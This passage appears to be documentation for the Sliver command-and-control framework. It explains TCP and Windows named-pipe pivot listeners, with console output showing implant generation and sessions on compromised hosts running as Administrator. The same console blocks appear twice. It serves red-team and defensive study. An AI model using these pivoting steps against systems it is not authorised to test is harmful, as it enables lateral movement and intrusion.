## TCP Pivots
TCP pivots are implemented in pure Go and are supported on all platforms.
```
[server] sliver (PRIOR_MANTEL) > pivots tcp

[*] Started tcp pivot listener :9898 with id 1

[server] sliver (PRIOR_MANTEL) > pivots

 ID   Protocol   Bind Address   Number Of Pivots
==== ========== ============== ==================
  1   TCP        :9898                         0
```

## Named Pipe Pivots (SMB)
Named pipe pivots are only supported on Windows. Select a session to start a named pipe listener, and then use the `--bind` flag to specify a pipe name. Pipes are automatically started on the local machine so you only need to specify a name, remote clients are always allowed to connect to the pipe, but the default ACL will only allow the current user/group. You can allow all user/groups by using the `--allow-all` flag:
```
[*] Session a2615359 WARM_DRIVEWAY - 192.168.1.178:59290 (WIN-1TT1Q345B37) - windows/amd64 - Mon, 07 Feb 2022 10:09:20 CST

[server] sliver > use a2615359-b0a4-4463-820b-f4dbe6fb2c30

[*] Active session WARM_DRIVEWAY (a2615359-b0a4-4463-820b-f4dbe6fb2c30)

[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar

[*] Started named pipe pivot listener \\.\pipe\foobar with id 1
```

Next we generate a named pipe implant using `generate --named-pipe 192.168.1.1/pipe/foobar` note here we may need to specify the IP address of the listener: `192.168.1.1`. The syntax is `<host>/pipe/<pipe name>`, note that `.` is equivalent to `127.0.0.1`. This is just the standard syntax for Windows named pipes.
```
[*] Session 13f9ee6b ROUND_ATELIER - 192.168.1.178:59290->WARM_DRIVEWAY-> (WIN-1TT1Q345B37) - windows/amd64 - Mon, 07 Feb 2022 10:15:11 CST

[server] sliver (WARM_DRIVEWAY) > sessions

 ID         Name            Transport   Remote Address                         Hostname          Username                        Operating System   Last Check-In                   Health
========== =============== =========== ====================================== ================= =============================== ================== =============================== =========
 13f9ee6b   ROUND_ATELIER   pivot       192.168.1.178:59290->WARM_DRIVEWAY->   WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      Mon, 07 Feb 2022 10:15:11 CST   [ALIVE]
 a2615359   WARM_DRIVEWAY   mtls        192.168.1.178:59290                    WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      Mon, 07 Feb 2022 10:15:11 CST   [ALIVE]
```

`
[server] sliver (PRIOR_MANTEL) > pivots tcp

[*] Started tcp pivot listener :9898 with id 1

[server] sliver (PRIOR_MANTEL) > pivots

 ID   Protocol   Bind Address   Number Of Pivots
==== ========== ============== ==================
  1   TCP        :9898                         0
`

`
[*] Session a2615359 WARM_DRIVEWAY - 192.168.1.178:59290 (WIN-1TT1Q345B37) - windows/amd64 - Mon, 07 Feb 2022 10:09:20 CST

[server] sliver > use a2615359-b0a4-4463-820b-f4dbe6fb2c30

[*] Active session WARM_DRIVEWAY (a2615359-b0a4-4463-820b-f4dbe6fb2c30)

[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar

[*] Started named pipe pivot listener \\.\pipe\foobar with id 1
`

`
[*] Session 13f9ee6b ROUND_ATELIER - 192.168.1.178:59290->WARM_DRIVEWAY-> (WIN-1TT1Q345B37) - windows/amd64 - Mon, 07 Feb 2022 10:15:11 CST

[server] sliver (WARM_DRIVEWAY) > sessions

 ID         Name            Transport   Remote Address                         Hostname          Username                        Operating System   Last Check-In                   Health
========== =============== =========== ====================================== ================= =============================== ================== =============================== =========
 13f9ee6b   ROUND_ATELIER   pivot       192.168.1.178:59290->WARM_DRIVEWAY->   WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      Mon, 07 Feb 2022 10:15:11 CST   [ALIVE]
 a2615359   WARM_DRIVEWAY   mtls        192.168.1.178:59290                    WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      Mon, 07 Feb 2022 10:15:11 CST   [ALIVE]
`

